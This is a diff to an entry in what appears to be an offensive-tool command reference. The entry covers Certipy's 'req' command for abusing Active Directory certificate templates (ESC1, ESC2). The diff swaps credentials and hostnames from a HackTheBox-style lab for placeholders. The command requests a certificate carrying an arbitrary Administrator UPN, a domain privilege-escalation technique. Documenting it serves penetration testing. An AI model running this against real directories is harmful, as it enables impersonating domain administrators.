@@ -3,21 +3,21 @@ description: |
   Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). The req command is useful for requesting, retrieving, and renewing certificates. Which is useful for exploiting serveral certifacte templating vulnerabilities like ESC1, ESC2, etc.
 
   Command Reference:
-  ```
-  User: e.black
+  
+  	Username: <user>
 
-  Password: ypOSJXPqlDOxxbQSfEERy300
+  	Password: <passwd>
 
-  arbitrary UPN: administrator
+    arbitrary UPN: <administrator>
 
-  domain: coder.htb
+    Domain: <domain.local>
 
-  DC: dc01.coder.htb
+    DC: <dc01.domain.local>
 
-  CA: coder-DC01-CA
-  ```
+    CA: <DC01-CA>
+
 command: |
-  certipy req -username e.black@coder.htb -password ypOSJXPqlDOxxbQSfEERy300 -ca coder-DC01-CA -target dc01.coder.htb -template newMaus -upn Administrator@coder.htb -dns dc01.coder.htb
+  certipy req -username <user>@<domain.local> -password <passwd> -ca <DC01-CA> -target <dc01.domain.local> -template newMaus -upn <administrator>@<domain.local> -dns <dc01.domain.local>
 
 code: |
     positional arguments:
@@ -43,6 +43,7 @@ services:
   - ADCS
 OS:
   - Windows
+  - Approved-tool
 attack_types:
   - Enumeration
 references:
